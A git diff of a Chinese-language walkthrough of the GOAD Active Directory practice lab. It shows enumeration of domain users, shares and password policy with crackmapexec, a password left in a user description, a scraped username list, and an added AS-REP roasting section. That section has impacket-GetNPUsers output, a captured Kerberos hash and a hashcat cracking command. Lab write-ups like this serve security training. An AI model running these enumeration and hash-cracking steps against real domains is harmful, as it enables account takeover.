@@ -33,9 +33,9 @@ SMB         192.168.56.11   445    WINTERFELL       north.sevenkingdoms.local\sa
 SMB         192.168.56.11   445    WINTERFELL       north.sevenkingdoms.local\jeor.mormont                   Jeor Mormont
 SMB         192.168.56.11   445    WINTERFELL       north.sevenkingdoms.local\sql_svc                        sql service
 ```
-获取了用户信息,发现samwell.tarly备注密码是Heartsbane
+获取了用户信息，发现samwell.tarly备注密码是Heartsbane
 
-在开始爆破前,检索密码策略
+在开始爆破前，检索密码策略
 ```bash
 cme smb 192.168.56.11 --pass-pol
 ```
@@ -60,7 +60,7 @@ SMB         192.168.56.11   445    WINTERFELL       Locked Account Duration: 5 m
 SMB         192.168.56.11   445    WINTERFELL       Account Lockout Threshold: 5
 SMB         192.168.56.11   445    WINTERFELL       Forced Log off Time: Not Set
 ```
-密码策略设置是,如果在 5 分钟内失败 5 次,我们将锁定帐户 5 分钟
+密码策略设置是，如果在 5 分钟内失败 5 次，我们将锁定帐户 5 分钟
 ### enum4linux
 常规信息
 ```bash
@@ -315,14 +315,14 @@ enum4linux complete on Sat Jun  3 09:57:42 2023
 ```
 ### rpcclient枚举
 
-相对标识符(Relative Identifier,RID)是Windows用于跟踪和识别对象的唯一标识符(十六进制表示)
-为了说明它的作用,让我们看下面的示例：
+相对标识符(Relative Identifier，RID)是Windows用于跟踪和识别对象的唯一标识符(十六进制表示)
+为了说明它的作用，让我们看下面的示例：
 * NAME_DOMAIN.LOCAL域的SID是：S-1-5-21-1038751438-1834703946-36937684957
 
-* 在域内创建对象时,上述数字(SID)将与RID组合,以生成一个用于表示对象的唯一值
-因此,带有RID：[0x457] Hex 0x457等于十进制数1111的域用户john,其完整的用户SID为：S-1-5-21-1038751438-1834703946-36937684957-1111
+* 在域内创建对象时，上述数字(SID)将与RID组合，以生成一个用于表示对象的唯一值
+因此，带有RID：[0x457] Hex 0x457等于十进制数1111的域用户john，其完整的用户SID为：S-1-5-21-1038751438-1834703946-36937684957-1111
 
-* 这是该域中john对象的唯一标识符,您永远不会在该域或任何其他域中看到此配对值与其他对象相关联
+* 这是该域中john对象的唯一标识符，您永远不会在该域或任何其他域中看到此配对值与其他对象相关联
 
 定义来自[此处](https://academy.hackthebox.com/module/143/section/1269)
 
@@ -509,9 +509,11 @@ NORTH\sql_svc
 
 Winterfell域控制器允许匿名连接,这就是我们可以列出域用户和组的原因
 
-但是现在几乎不会发生这种类型的配置(相反,在用户描述中使用密码经常发生x)
+但是现在几乎不会发生这种类型的配置(相反，在用户描述中使用密码经常发生x)
 
 使用暴力破解来枚举有效用户
+
+生成用户名字典
 ```bash
 curl -s https://www.hbo.com/game-of-thrones/cast-and-crew | grep 'href="/game-of-thrones/cast-and-crew/'| grep -o 'aria-label="[^"]*"' | cut -d '"' -f 2 | awk '{if($2 == "") {print tolower($1)} else {print tolower($1) "." tolower($2);} }' > got_users.txt
 ```
@@ -768,11 +770,11 @@ Script krb5-enum-users摘要:
 
 >通过强制查询可能的用户名对Kerberos服务进行验证来发现有效的用户名
 
->当请求无效的用户名时,服务器将使用Kerberos错误代码KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN响应,从而使我们确定用户名无效
+>当请求无效的用户名时，服务器将使用Kerberos错误代码KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN响应，从而使我们确定用户名无效
 
->有效的用户名将引起AS-REP响应中的TGT或错误KRB5KDC_ERR_PREAUTH_REQUIRED,表示需要用户执行预身份验证
+>有效的用户名将引起AS-REP响应中的TGT或错误KRB5KDC_ERR_PREAUTH_REQUIRED，表示需要用户执行预身份验证
 
-当爆破用户时,badpwdcount值不会增加
+当爆破用户时，badpwdcount值不会增加
 
 用CME工具POC:
 
@@ -834,4 +836,45 @@ SMB         192.168.56.22   445    CASTELBLACK      all             READ,WRITE  
 SMB         192.168.56.22   445    CASTELBLACK      C$                              Default share
 SMB         192.168.56.22   445    CASTELBLACK      IPC$            READ            Remote IPC
 SMB         192.168.56.22   445    CASTELBLACK      public                          Basic Read share for all domain users
+```
+## 获得用户密码
+知道用户名,获取密码,两种方式:
+* AS-REP Roast
+
+* Password spray密码喷洒
+
+### AS-REP Roast
+[AS-REP Roasting](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)
+>AS-REP烤饼（AS-REP roasting）是一种技术，可以获取选择了**不需要Kerberos预身份验证标志**的用户的密码哈希值
+
+根据之前结果制作[字典](https://github.com/N1etzsche0/GOAD/blob/main/GOAD-Part3-Find-User/Workspace/north.sevenkingdoms.local-users.txt)
+```bash
+impacket-GetNPUsers north.sevenkingdoms.local/ -no-pass -usersfile north.sevenkingdoms.local-users.txt
+```
+```bash
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[-] User sql_svc doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User jeor.mormont doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User samwell.tarly doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User jon.snow doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User hodor doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User rickon.stark doesn't have UF_DONT_REQUIRE_PREAUTH set
+$krb5asrep$23$brandon.stark@NORTH.SEVENKINGDOMS.LOCAL:30a743660db54d8c4207ddead8d482d5$639bf91110289d44bf8e5bc52610fb3b143df403804d2a2e569bc8ed306b3cb239b37124655cd3849ba2b76afe8bacb99410795d71b69ac7dfd04878f0b5418cb5cbd6331cb9aef0001183e2b6c3bc79523642632fdeb2ae5e6bda416b700869a2e7304c6db791808b9db7c69c9718c7f863851229ecf788d7996e0ee64a07b7c05af310a4d6653069262200723927e20a963b5c2fb545ff4f8e69e021d75790d0916be457a8aff298f7a0dc4410bf408ab0bcec67b12dafda8fd1563162e01bd91e3e011cbdd68d6aa6241e2699d607ce3e4c11830f8f8edbfc358fe8fb7fa47715c377a555fa96d3d0baf3d2aad9418b13a650671caa8aa2ba2bc7e91e8411c83849814a9c
+[-] User sansa.stark doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User robb.stark doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User catelyn.stark doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User eddard.stark doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User arya.stark doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+[-] User vagrant doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
+```
+GetNPUsers摘要:
+>这个脚本会尝试获得并列出不需要Kerberos域认证(UF_DONT_REQUIRE_PREAUTH)的用户，输出和JtR兼容。
+
+hashcat破解
+```bash
+./hashcat.bin -m18200 '$krb5asrep$23$brandon.stark@NORTH.SEVENKINGDOMS.LOCAL:6c40c1569d7d9bda2eeebca93e7c3b4d$ee84863d7ed647f92f68bc6888d202f86e06bedd84ee0eaa96c9a01e32cc99a01e2da9786775cf4c815ff5fa89e0d9ef7251d4ccf6765824cef1c7f21cd127c4a0c0a526c9adb4909b2d747c788bbfb30aad9d2f40fd8bef7a9906be11c095532bcb4856fd64c7955e82949dda366a70febbd7ce8b45bd809c40caeb02e3e9bede478361705bdac54ba59e3abec5a2b619ece365987504b1fc2ec82276ae3b197dc688e09944ace8743dd975868ff5f338cc9bb385c1ef5d263c4e93854140e22aec344e09d25127b95fd123c7e788a34438082ceea6190923bd02e3a263287ed082e0df732f3644e84497ee3d5ff6a3d97567f9f437621be5756154c76f38e45f6c220d1f1a' ../../rockyou.txt --force
 ```
